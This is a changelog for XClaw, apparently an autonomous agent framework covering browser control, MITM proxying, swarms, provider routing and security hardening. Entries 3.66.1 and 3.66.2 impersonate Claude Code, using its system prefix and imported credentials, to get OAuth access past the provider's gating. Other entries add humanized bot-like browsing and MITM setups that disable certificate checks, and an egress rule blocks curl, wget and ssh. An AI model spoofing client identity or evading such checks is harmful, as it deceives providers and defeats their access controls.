- Tests (MCP had ZERO): stdio round-trip against a real spawned fixture server, http mock with cache-hit assertions, dead-server tolerance, adapter defs/dispatch, loop wiring. 9 new tests.
- Strategy C respected: no changes to `xclaw-server.mjs` (16MB bundle) or computer modules — MCP is agent-side.

## 3.76.1 — Security hardening: real egress boundary, env policy, bind guard

- **Egress is now enforced by netns, not regex**: bwrap `--unshare-net` defaults ON whenever `security.egress.mode ≠ allow` (netns probe with honest `netnsDegraded` fallback; live-verified `curl` NET-BLOCKED under `--unshare-net`). The command-pattern screen stays as a fast pre-check only.
- **Tool spawn env policy** (`src/security/env-policy.mjs`): bash subprocesses no longer inherit secrets. `security.bashEnv`: `strip-secrets` (default) / `allowlist` (prod default) / `inherit`; `envAllow`/`envDeny` escape hatches; `XCLAW_BASH_ENV` override.
- **Non-login `-c` bash on every spawn path** (the no-plan path previously ran `-lc` with full env); `BASH_ENV`/`ENV` rc-injection cleared everywhere; `security.bashLogin: true` restores `-lc`.
- **Gateway bind guard** (`src/gateway/bind-guard.mjs`): refuses non-loopback bind without a token (`XCLAW_GATEWAY_ALLOW_OPEN=1` opt-out). `xclaw init --profile prod` now generates + stores the token; config file chmod 600.
- **Loop-guard fix**: global circuit breaker counts ALL calls (`totalCalls`) — it previously counted the sliding window, so `historySize < threshold` silently disabled it (broken in every profile's hard ceiling).
- **Hermetic tests**: `findMitmCaCert` no longer falls back to the operator's `~/.mitmproxy` when a confdir is explicitly configured (2 host-leak failures fixed); build stamp gains `fullRebuild: false` (stamp test fixed). Suite: 1034 pass / 0 fail.
- `docs/GROK-PROGRESS.md` reconstructed as an append-only ledger from git history.


## 3.76.0 — Security phase: egress, kill-switch, live e2e, media CI

- **Egress policy** (`src/security/egress.mjs`): prod default deny network shell; allowlist hosts; `XCLAW_EGRESS`
- **Agent loop** hooks egress after sandbox; blocks curl/wget/ssh/URL patterns in prod
- **Session kill-switch** (`src/agent/session-control.mjs`): register/kill/killAll; CLI `stop-all`, `sessions-active`
- **runAgentLoop** registers every run + merged AbortSignal; outer finally unregisters
- **Doctor**: `security.egress`, `security.killSwitch` checks
- **Native browser** list/read/navigate + redirects; `BrowserTabTool` registry; transcripts CLI
- **CI**: `unit-media` job (apt ffmpeg); skip frame test without ffmpeg; security pack includes egress/session tests
- **Live verified** (xAI grok-4.5): LIVE_OK, PROOF_LIVE tools, multi-step STEP1+STEP2 concat
- Docs: `XCLAW.md` security section

## 3.75.0 — Verify pass (strong model on final answer)


- `src/providers/verify-pass.mjs` — VERIFY_OK / VERIFY_REVISE protocol
- Agent loop runs verify when `router.roles.verify` is set and final text has no tools
- Soft mode: emit `verify_suggest`; hard mode: `rolePolicy.verifyReplace: true`
- Tests: `test/verify-pass.test.mjs`

## 3.74.0 — Native computer default + session API

- Default `computer.engine: "native"` (thin server, not 16MB bundle)
- `src/computer/engine.mjs` — resolveComputerEngine / isNativeComputer
- Thin server implements `/xclaw/sessions/*` for computer-client compatibility
- Bundle via `computer.engine: "bundle"` or `XCLAW_COMPUTER_NATIVE=0`
- Tests: `test/computer-engine.test.mjs`

## 3.73.0 — Role routing (draft / act / verify)

- `src/providers/role-router.mjs` — role map, policy, role-aware provider facade
- Agent loop: optional multi-model by turn (draft first, then act)
- Config: `router.roles`, `router.rolePolicy`, `XCLAW_ROLE_DRAFT` / `_ACT` / `_VERIFY`
- Events: `router` phase `role` | `roles_ready` | `role_failover`
- Tests: `test/role-router.test.mjs`

## 3.72.0 — Multi-provider failover router

- `src/providers/failover-router.mjs` — model chain, shouldFailover, createFailoverProvider
- Agent loop uses failover by default (`router.enabled !== false`)
- Config: `agent.fallbackModels`, `router.chain`, `router.roles`, `XCLAW_FALLBACK_MODELS`
- Failover on 429/5xx/transient/auth; skip permanent 4xx
- Events: `router` phase chain|failover|skip|ready
- Tests: `test/failover-router.test.mjs`

## 3.71.0 — P0 thin computer server + clean browser_tab

- `modules/browser-tab-tool.mjs` — lightweight fetch-based tab (CDP upgrade path)
- `thin-server.mjs` — `/health` `/tools` `/call` `/extraction` without 16MB bundle
- `manager.startComputer` uses thin server when `XCLAW_COMPUTER_NATIVE=1` or `computer.nativeServer`
- Native pack includes browser_tab

## 3.70.0 — P0 computer extraction (clean native tools)

- CLEAN modules: `modules/bash-tool.mjs`, `modules/file-tools.mjs` (no bundle scope)
- `native-tools.mjs` registry + `executeNativeTool`
- `extraction-status.mjs` + `scripts/check-extraction.mjs`
- MODULE_MAP updated with cleanStandaloneTools
- Tests: `test/native-tools.test.mjs`
- Next: browser_tab clean module + thin HTTP router over native pack

## 3.69.0 — xclaw_recall durable memory retrieval

- `src/memory/recall.mjs` — keyword recall over events.jsonl + optional swarm receipts
- Tool `xclaw_recall` wired into agent loop (register + execute)
- Config: `memory.recall=false` to disable
- Tests: `test/recall.test.mjs`

## 3.68.0 — Context compaction (P0 long-horizon)

- `src/tokens/compaction.mjs` — tool offload to disk + extractive fold under pressure
- Agent loop: after eviction, runs `compactMessages` when pressure ≥ trigger
- Protects leading system (OAuth attestation / cache prefix)
- Config: `tokens.compaction.*` (enabled, triggerPressure, foldPressure, offloadThresholdChars)
- Tests: `test/compaction.test.mjs`

## 3.67.0 — Full Claude OAuth in agent loop

- Native Anthropic Messages provider (`src/providers/anthropic-messages.mjs`)
- OAuth attestation + headers automatic for `sk-ant-oat*` tokens
- Agent loop resolves auth profiles async (anthropic oauth profile)
- Registry: anthropic api = anthropic-messages
- Models: sonnet/opus/fable/haiku selectable via agent.model

## 3.66.2 — OAuth system attestation (sudo-ai parity)

- Required system prefix: `You are Claude Code, Anthropic's official CLI for Claude.`
- Without it, Sonnet/Opus/Fable return misleading 429 rate_limit_error on OAuth
- `src/providers/anthropic-oauth-headers.mjs` — headers + ensureOAuthSystemAttestation
- Verified live: Sonnet/Fable/Opus 200 with attestation

## 3.66.1 — Claude Code binary endpoint parity + credential import

- Defaults aligned with Claude Code 2.1.226 native strings (`platform.claude.com/v1/oauth/token`)
- `importClaudeCodeCredentials` reads `~/.claude/.credentials.json` (`claudeAiOauth`)
- CLI: `--method import-claude-code`

## 3.66.0 — Claude / Anthropic OAuth PKCE

- `src/auth/anthropic-oauth.mjs` — PKCE authorize URL, paste-code exchange, refresh
- `oauth-policy` anthropic kind `claude_pkce`
- CLI: `xclaw models auth login --provider anthropic|claude --method oauth`
- Registry env: `CLAUDE_CODE_OAUTH_TOKEN`, `ANTHROPIC_AUTH_TOKEN`, `ANTHROPIC_API_KEY`
- Docs: `docs/AUTH_CLAUDE_OAUTH.md`

## 3.65.0 — S2 merge/vote use receipts

- `evaluateReceiptPolicy`, `receiptVoteWeight`, `buildRunReceiptSummary`
- Merge gates fail when `requireReceipts` and implement/verify/critic lack receipts
- Vote weights multiply by receipt quality (missing → 0.25 or 0 if hard)
- Swarm run stores `receiptSummary` + returns `receipts` policy summary
- Config: `swarm.requireReceipts` or `XCLAW_SWARM_REQUIRE_RECEIPTS=1`

## 3.64.1 — Swarm failure receipts completeness

- Receipts on retry-exhausted failures and skipped nodes (`UPSTREAM_FAILED`, `DEPS_NOT_TERMINAL`)
- Docs: failure handling table in SWARM_RECEIPTS.md

## 3.64.0 — S1 universal swarm node receipts

- `src/agents/swarm-receipt.mjs` — build/write/list receipts for any domain (shell, files, repo, browser, …)
- Effects inferred from tool trace; browser fields optional
- `swarm-run` attaches receipt on node success and final failure
- Stored at `~/.xclaw/swarms/runs/<swarmId>/receipts/<nodeId>.json`
- Tests: `test/swarm-receipt.test.mjs`

## 3.63.0 — C2 trusted fabric role at swarm spawn

- `mapSwarmRoleToFabric` / `bindSwarmSpawnRole` in role-binding
- `spawnSubagent` binds fabric role when role/swarmRole set (spawn id + session id)
- swarm-run passes node role into spawn
- Agent loop resolves role from session bind (not free env) for browser belt
- `xclaw_spawn_subagent` accepts `role` enum
- Tests: `test/browser-c2-swarm-role.test.mjs`

## 3.62.0 — C1 auto-renew tab lease heartbeat

- `src/browser/lease-heartbeat.mjs` — start/stop/touch/acquireWithHeartbeat
- hooks: touch + start heartbeat on successful beforeNavigate/beforeInput when fabric enforce + tabId
- `tab_lease` acquire starts heartbeat; release stops; renew/heartbeats actions
- Env: `XCLAW_TAB_LEASE_HEARTBEAT`, `XCLAW_TAB_LEASE_HEARTBEAT_MS`, `XCLAW_TAB_LEASE_TTL_MS`
- Tests: `test/browser-c1-heartbeat.test.mjs`

## 3.61.0 — B4 alerting polish

- Alerter: `alertLiveE2eFailure`, `alertEnforcementFailure`
- Targets inherit `liveE2e.cron.delivery` (and doctor delivery)
- live-e2e cron uses shared live-e2e alert helper
- Doctor cron runs CLI `a.*`/`h0.*` enforcement slice and alerts on errors
- Doctor `quiet` option for scheduled runs
- Tests: `test/alerting-b4.test.mjs`

## 3.60.0 — B3 live e2e cadence

- `src/cron/live-e2e-job.mjs` — run + log + optional alert; ensureLiveE2eCronJob (default 24h)
- CLI: `xclaw live-e2e`, `xclaw live-e2e-schedule [everyMs]`
- docs/PROD_PRESET.md + OPS.md — nightly/pre-release/systemd timer
- npm: `live-e2e:cron`, `live-e2e:schedule`

## 3.59.0 — B2 production enforcement preset

- `docs/PROD_PRESET.md` — copy-paste prod/lab env, verify commands, checklist, incident hints
- `OPS.md` — Production enforcement preset section linking full doc

## 3.58.0 — B1 release-gate A-enforcement

- `release-gate` always runs `a-enforcement-e2e` (required, including `--quick`)
- `bundle-markers` step requires A2/A4/A5 strings in xclaw-server.mjs
- `--live` / `XCLAW_LIVE_E2E=1` adds live-enforcement-e2e
- npm: `release-gate:live`, `check-bundle-markers`
- Offline A-smoke exit 1 (warnings) treated as pass for gate; exit 2 fails release

## 3.57.0 — A8 fabric durability (locks + heartbeat)

- `src/browser/fabric-lock.mjs` — cross-process exclusive lock with stale reclaim
- Leases, gates, clock, session roles RMW under `withFabricLock`
- `renewTabLease` heartbeat (TTL extend + heartbeatCount)
- `tab_lease` tool action `renew`
- Tests: concurrent lock serialization, steal denied, parallel tabs, gate lock

## 3.56.0 — LIVE-E2E enforcement script

- `scripts/live-enforcement-e2e.mjs` — starts computer if needed, session + tools/call probes
- Asserts commit gate on /checkout, jsCode motor block, read js allowed, optional motor/nav
- Flags: `--json` `--no-start` `--keep`
- npm: `live-e2e` / `live-enforcement`

## 3.55.0 — A7 bypass closure (jsCode + role binding)

- `src/browser/jscode-policy.mjs` — block click/type-like jsCode under fabric/prod
- `src/browser/role-binding.mjs` — session-bound roles; env ignored under strict unless XCLAW_ROLE_FROM_ENV=1
- hooks beforeInput checks jsCode + resolveRole
- Bundle + gateway pass jsCode into beforeInput
- Tool: `session_role` bind|get|resolve
- Doctor: a.jscode_* + a.role_binding
- Tests: `test/browser-a7-bypass.test.mjs`

## 3.54.0 — A6-ops: doctor enforcement + e2e smoke

- Doctor section `a.*`: bridges, hooks, motor, chrome-args, role checks, bundle markers, prod strict
- `scripts/a-enforcement-e2e.mjs` — offline-first Phase A smoke (exit 0/1/2)
- npm scripts: `a6` / `a-enforcement`
- Env: `XCLAW_ROOT`, `XCLAW_ENFORCEMENT_STRICT=1` / `profile=prod` for hard gates in doctor

## 3.53.0 — Phase A5 single Chrome argv path

- `src/computer/chrome-args.mjs` — canonical buildChromeArgs (H0 + MITM + sandbox)
- `src/computer/chrome-args-bridge.mjs` — computer process loader
- Bundle `ensureRunning` replaces argv via bridge before spawn
- Clean `browser-service.mjs` uses same builder before spawn
- manager sets XCLAW_CHROME_ARGS_BRIDGE
- Tests: `test/chrome-args.test.mjs`
- Phase A (A1–A5) enforcement plane complete for launch + navigate + fabric + motor

## 3.52.0 — Phase A4 humanized CDP motor

- `src/browser/motor.mjs` — planClick/Type/Scroll via Fitts + key delays → Input.dispatch* steps
- `src/computer/motor-bridge.mjs` — load + runMotorOnClient
- `xclaw_browser_tab` accepts `motor: { op, x, y, text, ... }` and executes on tabClient
- Agent tools: `browser_click`, `browser_type`
- manager injects XCLAW_MOTOR_BRIDGE
- Tests: `test/browser-motor.test.mjs`

## 3.51.0 — Phase A3 fabric on more actuation paths

- Tab tool `call` entry runs `beforeInput` (lease + role) before any act
- Navigate path keeps `beforeNavigate` + `afterAction` binding
- Gateway belt: agent loop checks hooks before `computer.callTool` for `xclaw_browser_tab`
- Read-only observe allowed for observer; evaluate/navigate still motor-gated
- Auto-acquire lease via `XCLAW_TAB_LEASE_AUTO=1` under fabric enforce
- Tests: `test/browser-hooks-a3.test.mjs`

## 3.50.0 — Phase A2 driver hooks on navigate path

- `src/browser/hooks.mjs` — beforeNavigate / beforeInput / afterAction / buildChromeArgs
- `src/computer/hooks-bridge.mjs` — resolve + load hooks from computer process
- `xclaw-server.mjs` — Page.navigate calls beforeNavigate (fail-closed when gates/enforce on)
- `manager.mjs` — injects XCLAW_ROOT + XCLAW_HOOKS_BRIDGE into computer env
- Enforcement: XCLAW_COMMIT_GATES, XCLAW_FABRIC_ENFORCE, role caps, tab leases
- Tests: `test/browser-hooks.test.mjs`

## 3.49.3 — Full computer bundle mapped + app layer extracted

- `src/computer/MODULE_MAP.json` — complete ~16.8MB / 395k-line region map
- `src/computer/modules/*` — all xclaw_* tools + skills/context + HTTP main extracted
- Clean `browser-service.mjs` remains the importable Chrome owner
- Vendored ~380k lines left in bundle by design; app ~15k lines now addressable

## 3.49.2 — Clean BrowserService module extracted from computer bundle

- `src/computer/browser-service.mjs` — importable, syntax-checked BrowserService (from xclaw-server.mjs)
- `src/computer/browser-tab-tool.extracted.mjs` — reference extract of xclaw_browser_tab
- `docs/COMPUTER_EDITABLE_MODULES.md` — edit-here vs run-there contract
- A2 can attach hooks on the clean module instead of string-patching 16MB

## 3.49.1 — Phase A1: Computer source of truth

- Documented that `src/computer/xclaw-server.mjs` (~16.8MB bundle) **is** the Chrome/CDP source — no pre-bundle tree in-repo
- Ownership map: `manager.mjs` lifecycle, `BrowserService.ensureRunning` launch, `xclaw_browser_tab` actuation
- Artifacts: `docs/COMPUTER_SOURCE_OF_TRUTH.md`, `src/computer/SOURCE_OF_TRUTH.json`
- Defines A2 hook targets (beforeNavigate / beforeInput / afterAction / buildChromeArgs)

## 3.49.0 — Horizon 5 Time-travel & causal eval

- `src/browser/timetravel.mjs` — loadTimeline, replay plan, scoreCausal, synthetic origin server
- Eval `scoreCase` honors `expect.causal` / `expect.network` / forbidHosts
- Tools: `trace_replay`, `trace_score`
- Offline synthetic HTTP origin from recorded flows (`startSyntheticOrigin`)
- Sample case: `eval/cases/causal-network.json`
- Tests: `test/browser-timetravel.test.mjs`

## 3.48.0 — Horizon 4 Session Physics + Swarm fabric

- `src/browser/physics.mjs` — tab leases, commit gates, role caps, logical clock
- Tools: `tab_lease`, `commit_gate`, `fabric_status`
- Roles: observer / actor / critic / planner motor permissions
- Commit-sensitive URL patterns (checkout, pay, delete, transfer, …)
- Swarm roles extended: actor, observer + critic fabric instructions
- Persist under `~/.xclaw/fabric/` (`XCLAW_FABRIC_DIR`)
- Env: `XCLAW_COMMIT_GATES=1`, `XCLAW_TAB_LEASE_TTL_MS`, `XCLAW_AGENT_ID`
- Tests: `test/browser-physics.test.mjs`

## 3.47.0 — Horizon 3 Motor + Identity maturity

- Motor v2: Fitts-law `fittsDuration` / `fittsID`, `readingPause`, mousePath uses targetWidth for MT
- `humanClick` optional label → reading pause before move
- Origin-partitioned profiles: `resolveOriginProfile`, `sanitizeOriginHost`, `listOriginProfiles`
  - `XCLAW_BROWSER_PROFILE_MODE=origin|shared`
  - `XCLAW_BROWSER_ORIGIN_ROOT` override
- NSS CA trust: dual import (profile DB + nssdb/), explicit trustOrder fallback chain
- Tests: `test/browser-horizon3.test.mjs`

## 3.46.0 — Horizon 2 Truth control plane

- `src/browser/truth.mjs` — policy DSL load/save/match/evaluate, require-rules, proof export
- `confdir/policy.json` merged into mitmproxy block/map (addons.py)
- Agent tools: `mitm_policy`, `mitm_export`
- Agent loop: `XCLAW_TRUTH_AUTO_ASSERT=1` runs require-rules after browser_* tools
- Proof bundle: redacted flows + bindings + policy summary + sha256
- Docs: policy DSL in MITM_SCRIPTING.md
- Tests: `test/browser-truth.test.mjs`

## 3.45.0 — Horizon 1 Fusion Sense

Structure-first observation + action↔network causal binding:

- `src/browser/sense.mjs` — actionId, network cursor/delta, bindActionFlows, assertOutcome, STRUCTURE_SNAPSHOT_JS
- `browser_observe` — primary sense tool (structure, not pixels)
- `browser_snapshot` — a11y-oriented interactive tree + network delta footer
- `browser_assert` — outcome assertions against MITM flows / action bindings
- `withNetworkBinding()` — wrap any tool execute with actionId + flow delta
- Bindings persisted to `action-bindings.jsonl` under MITM confdir
- Tests: `test/browser-sense.test.mjs`

## 3.44.0 — Horizon 0 production foundations

First-principles hardening of the browser organism (identity, CDP, MITM, motor readiness):

- `src/browser/horizon0.mjs` — production Chrome arg builder, profile lock, flow rotation, checklist
- BrowserService: `--remote-allow-origins=*`, `--disable-dev-shm-usage`, headed window geometry, UA override
- Fix Docker flag bug (`--no-sandbox --disable-gpu` was a single invalid argv entry)
- Durable profile exclusive lock + reclaim stale PID; release on stop/exit
- CDP port acquire timeout (`XCLAW_BROWSER_PORT_TIMEOUT_MS`, default 30s)
- MITM: rotate `flows.jsonl` at start + supervisor tick; recover dead mitmdump
- Supervisor logs Horizon 0 checklist on boot
- Doctor: `h0.*` checks + production flag verification
- Tests: `test/browser-horizon0.test.mjs`

## 3.43.0 — Mitmproxy CA certificate management

- `getMitmCaInfo` / `ensureMitmCa` / `exportMitmCa` / `mitmCaStatus`
- Agent tool `mitm_ca`: status | ensure | export | trust
- Supervisor runs `ensureMitmCa` before wait-ready (SPKI on first Chrome start)
- Doctor reports CA subject / expiry / SPKI prefix
- Export writes PEM + P12 + `.spki` sidecar + chrome flag

## 3.42.3 — MITM integration hardening

- `findMitmdump` searches `~/.local/bin` even when PATH is minimal
- `mitmEnvFromConfig()` + inject into computer spawn and supervisor gateway env
- `waitForMitmReady()` — supervisor waits for listen + CA + ready before continuing
- `XCLAW_CHROME_MITM_ARGS` honored by BrowserService (bundle)
- Doctor: `mitm.binary` / `mitm.proxy` / `mitm.ca`
- INSTALL + OPS startup order; Dockerfile optional mitmproxy hint

## 3.42.2 — Addon hooks expansion

- `requestheaders` early block (before body)
- `responseheaders` optional Set-Cookie strip (`XCLAW_MITM_STRIP_COOKIES`)
- `error` + `tls_failed_client` / `tls_failed_server` → flows + stats.json
- `running` writes `confdir/ready` for supervisor probe
- `mitm_status` surfaces ready / errors / blocked / tlsFail*

## 3.42.1 — Mitmproxy scripting surface

- Expanded `addons.py`: block / path-map / body capture / host dumps / WS echo
- Env: `XCLAW_MITM_BLOCK`, `XCLAW_MITM_MAP`, `XCLAW_MITM_CAPTURE_BODY`, `XCLAW_MITM_BODY_MAX`, `XCLAW_MITM_DUMP_HOSTS`
- Docs: `docs/MITM_SCRIPTING.md`
- Example: `src/browser/mitm-confdir/examples/inject_header.py`

## 3.42.0 — M3 MITM agent tools

- `mitm_status` — enabled / running / port / CA / flowCount
- `mitm_flows` — filtered list (host, method, status, urlContains, sinceTs)
- `mitm_clear_flows` — truncate flows.jsonl
- `mitm_control` — start | stop | status sidecar
- `readMitmFlows` filters + `mitmStatus` / `clearMitmFlows` / `formatMitmFlows`
- Registered via `createBrowserTools` → agent local tools
- Tests: 22/22

## 3.41.0 — M2 Chrome proxy + CA trust

- `chromeMitmArgs()` / `findMitmCaCert()` / `mitmCaSpkiHash()` / `trustMitmCaInProfile()`
- `BrowserService.ensureRunning`: when `XCLAW_MITM` on → `--proxy-server` + `--proxy-bypass-list=<-loopback>`
- Prefer `--ignore-certificate-errors-spki-list=<SPKI>` from mitmproxy CA (openssl)
- Optional `certutil` import into profile NSS DB
- Lab escape: `XCLAW_MITM_INSECURE_CERTS=1` → `--ignore-certificate-errors`
- Runtime CDP `Security.setIgnoreCertificateErrors(true)` after connect
- Tests: 19/19 in `test/browser-mitm.test.mjs`

## 3.40.0 — M1 MITM sidecar (opt-in)

- Feature gate: `XCLAW_MITM=true` or `browser.mitm.enabled` (default **off**)
- `src/browser/mitm.mjs` — start/stop mitmdump, confdir, pid, flow log
- Package confdir + `addons.py` (redacts secrets, allowlist, flows.jsonl)
- Supervisor: `ensureMitm()` on boot + each tick
- `chromeProxyArgs()` ready for M2 (`--proxy-server=http://127.0.0.1:4444`)
- Env: `XCLAW_MITM`, `XCLAW_MITM_PORT`, `XCLAW_MITM_CONFDIR`, `XCLAW_MITMDUMP`, `XCLAW_MITM_ALLOWLIST`, `XCLAW_MITM_SSL_VERIFY`
- Tests: `test/browser-mitm.test.mjs` (14/14)

## 3.39.0 — B0 Human-like browser (1 year ahead)

- Durable Chromium profile vault (`XCLAW_BROWSER_PROFILE_DIR`, default `~/.xclaw/browser-profiles/default`)
- Headed mode via `XCLAW_BROWSER_HEADED=1` (visible window, human presence)
- `src/browser/humanize.mjs` — Gaussian delays, cubic-bezier mouse paths, typing cadence, scroll momentum
- `src/browser/profile.mjs` — resolve/seed/lock durable profiles
- `ensureRunning` respects profile vault; `stop` never wipes durable data
- Config: `browser.profileDir`, `browser.headless`, `browser.humanize`, `browser.humanizeSpeed`, `browser.copySession`
- Env: `XCLAW_BROWSER_PROFILE_DIR`, `XCLAW_BROWSER_HEADED`, `XCLAW_BROWSER_HUMANIZE`, `XCLAW_BROWSER_HUMANIZE_SPEED`, `XCLAW_BROWSER_COPY_SESSION`

## 3.38.0 — Suggestions / toolTrace / WebChat surfaces

- Normalized `toolTrace` (status, outcome, artifacts) + family outcome parsers
- Schema-native suggestion chips, closure suppress, durable feedback bias
- Commit chip when closed + git dirty (`closedAllowCommitChip: "auto"`)
- Turn goal/progress state + blocked/approval UX
- WebChat ↳ chips + feedback API
- Doctor + Prometheus agent/suggestion metrics
- Grafana dashboard: `deploy/grafana/xclaw-agent-suggestions-dashboard.json`
- E2E: `test/suggestions-e2e.test.mjs`

## 3.37.0 — Stream resume, CLI run, metrics

Durable SSE/NDJSON streaming with Last-Event-ID resume for agent, swarm, and webchat.

### Protocol
- Dual transport: `Accept: text/event-stream` or `application/x-ndjson`
- Heartbeat pings (configurable `stream.heartbeatMs`)
- Resume modes: `new` · `resume-live` · `replay-only` · `missing`
- Ring buffer per `streamId` (`stream.capacity`, `stream.ttlMs`)

### Endpoints
- `POST /agent/run/stream`
- `POST /swarm/run/stream`
- `POST /channel/webchat/message/stream`

### Client & CLI
- `src/client/stream-resume-client.mjs` — learn `streamId`/`lastEventId`, dedupe, outer resume
- `xclaw run [--ndjson] [--resume <id>] [--last-event-id <id>]`
- `xclaw agent --stream …` routes to the same path
- Exit codes: 0 success · 2 not-found/expired · 3 auth · 4 forbidden · 5 bad request · 6 max cycles · 7 transient · 130 aborted
- `--json-error` machine-readable failure payload + hints
- Backoff: `--backoff full|equal|decorrelated|none` (config `stream.backoff`)

### Observability
- Telemetry: `recordStreamError` / `recordResumeEvent` (no high-cardinality labels)
- Prometheus: `xclaw_stream_errors_*`, `xclaw_stream_resume_events_*`, `xclaw_stream_logs`
- Grafana: `deploy/grafana/xclaw-stream-dashboard.json` + recording rules
- Docs: `docs/stream-config.md`, `docs/cli-run-exit-codes.md`, `docs/backoff-strategies.md`, `docs/error-handling-stream.md`

### Config (`xclaw.json` / env)
```json
"stream": {
  "capacity": 500,
  "ttlMs": 300000,
  "heartbeatMs": 15000,
  "backoff": "full",
  "baseMs": 1000,
  "maxMs": 30000,
  "maxResumeCycles": 5
}
```
Env: `XCLAW_STREAM_CAPACITY`, `XCLAW_STREAM_TTL_MS`, `XCLAW_STREAM_HEARTBEAT_MS`, `XCLAW_STREAM_BACKOFF`, …

### Scripts
- `scripts/xclaw-run-lib.sh` — classify / should_retry / should_fresh
- `scripts/xclaw-run-with-retry.sh` — retry exit 7 with jitter strategies

### Tests
- `test/stream-resume*.test.mjs`, `stream-writer`, `stream-reconnector`, `stream-telemetry`, `prometheus-stream-metrics`, `stream-run-cli`, `stream-config`, e2e resume

## 3.31.0

- X1 admission control: maxDepth, maxWaitMs, concurrency, QED staffing
- GET /queue/admission
- D3 control swarm UI, SSE reconnect, backoff/IMM utilities (3.27–3.30)

## 3.11.0 — Three Grok auth modes

- 1) API key  2) OAuth/CLI  3) Web login (grok.com session import)
- xclaw auth login --method api|oauth|web
- xclaw auth web-import --cookie|--file|--token
- docs/AUTH_THREE_WAYS.md

## 3.10.0 — Sign in with Grok / xAI (OAuth Option B)

- xclaw auth login | logout | status | import-grok
- Device code, PKCE, import ~/.grok/auth.json, API key fallback
- src/auth/xai-oauth.mjs · docs/AUTH_XAI_OAUTH.md

## 3.9.0 — Live Voice Agent (Personal Assistant)

- Presets: Customer Support, Sales, Scheduler, Personal Assistant, Lead Qualification
- Personal Assistant: full host control (bash/files/browser/swarm) during live talk
- Speak-while-tools + barge-in mutes speech only
- docs/VOICE_AGENT_PERSONAL_ASSISTANT.md

## 3.8.0 — Mandatory XClaw commit signature

- Default commitAfterMerge: true
- prepare-commit-msg hook on worktree/merge
- Always: Generated with [XClaw] + Co-Authored-By: XClaw <noreply@xclaw.local>
- docs/XCLAW_COMMIT_SIGNATURE.md

## 3.7.9 — XClaw commit trailers

- Generated with [XClaw](https://x.ai/)
- Co-Authored-By: XClaw <noreply@xclaw.local>
- src/git/commit-trailers.mjs

## 3.7.8 — Vote tie-breaking + ship

- Strategies: none, first, last, lexical, confidence, prefer, random
- Role weights + ballot confidence field
- Default voteTieBreak: confidence
- Vote soak: scripts/soak-vote.mjs, docs/VOTE_SOAK.md
- docs/SHIP_3.7.8.md

## 3.7.7 — Structured majority voting

- swarm-vote: extract JSON ballots, tally fields, minority report
- Join summary includes consensus section
- Research role prompt asks for flat JSON ballot
- Config: voteEnabled, voteMinBallots, voteMinShare, voteFields
- test/swarm-vote.test.mjs

## 3.7.6 — Git remotes, credentials, SSH CA + ship

- validateGitRemoteUrl / listAndValidateRemotes
- git credential fill/approve/reject integration
- Env: XCLAW_GIT_TOKEN / GITHUB_TOKEN headless fill
- SSH CA helpers: inspect/sign/snippets (src/git/ssh-ca.mjs)
- REPO_MISSING handling on merge approve
- merge doctor diagnostics
- Doctor: git.remotes + git.credential + ssh.certs
- docs/GIT_CREDENTIAL.md, docs/SSH_CA.md, docs/SHIP_3.7.6.md

## 3.7.5 — S5 swarm/merge CLI

- `xclaw swarm status|show|policy`
- `xclaw merge list|show|approve|reject`
- Prefix id match, ASCII graph on show, --json
- docs/S5_CLI.md

## 3.7.4 — S4 merge governance + swarm arc close

- mergeRequireCleanMain — block when main worktree or index dirty
- mergeUseIndex — git apply --index / --check --index
- inspectRepoCleanliness helper
- Doctor: swarm.merge policy + pending proposals
- S1 mock spawnSubagent runtime fan-out tests
- docs/S4_MERGE_GOVERNANCE.md, docs/SHIP_3.7.4.md
- Swarm arc S0–S4 closed for release

## 3.7.3 — S3 safe worktree merge

- planAndMaybeMerge: gates → git apply --check → auto or pending_approval
- Durable merge proposals under ~/.xclaw/swarms/merge-proposals/
- Tools: xclaw_swarm_merge_approve | reject | status
- swarm.autoMerge default false (prod-safe)
- docs/S3_SAFE_MERGE.md

## 3.7.2 — S2 task graph (dependsOn)

- DAG tasks with `id` + `dependsOn`
- Topological wave scheduler (reuses graph-viz waves)
- Upstream result handoff into child prompts
- onDepFail: skip-downstream | fail-fast | best-effort
- Join summary includes ASCII wave diagram
- SwarmRun persists graph + ascii/mermaid/dot
- S1 flat tasks remain compatible
- docs/S2_TASK_GRAPH.md

## 3.7.1 — S1 swarm fan-out

- `xclaw_swarm_run` tool — parallel subagents + join summary
- Roles: research / implement / verify / critic
- Caps: maxParallel, maxChildrenPerRun
- SwarmRun records results + summary on disk
- docs/S1_SWARM_FANOUT.md

## 3.7.0 — R6 install + S0 swarm foundations

### R6
- install/install.sh + install.ps1
- INSTALL.md quick path + proof checklist

### S0
- ~/.xclaw/swarms/{agents,runs} durable store
- spawnSubagent timeout (default 5m) + persist snapshots
- configureSubagentPersistence on gateway start
- Metrics xclaw_subagents_*
- Doctor swarm.agents / persisted / runs

## 3.6.4 — R5 learning light

- proposeSkillFromSuccess (review-only drafts)
- Preference extract + ~/.xclaw/memory/preferences.md write-back
- Job pass hooks proposeOnSuccess + preferences
- Doctor: skills.proposals, memory.preferences

## 3.6.3 — R4 proactive heartbeat

- autonomy.heartbeat everyMs job via cron scheduler
- quietHours + maxUsdPerDay guards
- Optional channel delivery when result is not HEARTBEAT_OK
- Doctor autonomy.heartbeat status
- Gateway starts ensureHeartbeat when enabled

## 3.6.2 — R3 owner safety

- /link issue+redeem DM-only (status/help allowed in groups)
- isDm on normalizeInbound + channel fixtures
- Doctor: prod requires gateway token; allowlist hints; linkDmOnly
- First-run tip on new xclaw.json
- security.linkDmOnly default true

## 3.6.1 — R2 unified inbound path

- Live Slack / Telegram / Discord / Email use processInbound
- Shared commands + rate limit + replyWithAgent path
- R1 channel health watchdog retained

## 3.6.0 — R1 always-on reliability

- Channel health watchdog (restart dead enabled channels)
- Channel status: running, loopAlive, lastError, lastOkAt
- Manager restartChannel / get
- Doctor: channels.health + computer.watchdog
- scripts/soak-r1.mjs
- Telegram poll jittered backoff on errors

## 3.5.3 — Profile precedence fix

- Profile name: XCLAW_PROFILE env → user.profile → DEFAULT lab
- Env profile re-applies pack then re-merges user (no label-only lie)
- Doctor: profile.mismatch when prod+autoApprove or lab/dev+!autoApprove

## 3.5.2 — Low-setup P0 fixes

- Default profile **lab** (auto-approve tools)
- dev profile also auto-approve (no bot hang)
- readiness.requireComputer **false** by default
- Email channel passes userId/channel for vault linking
- INSTALL.md minimal setup for v3.5.x

## 3.5.1 — Doctor account checks

- accounts / accounts.<id> / accounts.pairing / accounts.vault.*
- Orphan links, empty accounts, legacy bare vault ids, migrate hints

## 3.5.0 — Multi-channel runtime (CL)

- src/channels/runtime.mjs — normalizeInbound + processInbound
